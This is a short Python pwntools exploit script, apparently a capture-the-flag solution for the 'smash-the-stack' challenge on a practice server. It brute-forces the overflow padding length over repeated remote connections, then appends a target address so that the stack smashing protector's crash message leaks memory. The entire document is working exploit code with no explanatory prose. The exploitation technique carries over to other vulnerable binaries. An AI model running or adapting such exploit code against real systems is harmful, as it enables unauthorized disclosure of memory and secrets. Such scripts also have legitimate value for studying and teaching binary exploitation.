from pwn import *
from struct import *

# Reference:
#	https://github.com/ctfs/write-ups-2015/tree/master/ekoparty-pre-ctf-2015/pwn/smashing-the-stack-for-fun-and-profit
#	http://seclists.org/bugtraq/2010/Apr/243
#
# Key words:
#	Stack Smashing Protector Memory Leak
#

n = 8
padding = ""
receive = ""
i = 0
lastFewChar = "./smash-the-stack terminated"
targetAddress = pack('<L', 0x804a060)

while True:
    n += 1
    padding = 'a' * n
    r = remote("hackme.inndy.tw", 7717)
    r.sendline(padding)
    receive = r.recvall()
    i = receive.find("terminated")
    if i == -1:
        continue
    else:
        i = receive[-len(lastFewChar)-1:].find("./")
        if i != -1:
            continue
        else:
            print receive[-len(lastFewChar)-1:]
            break

r = remote("hackme.inndy.tw", 7717)
r.sendline(padding + targetAddress)
receive = r.recvall()
print receive
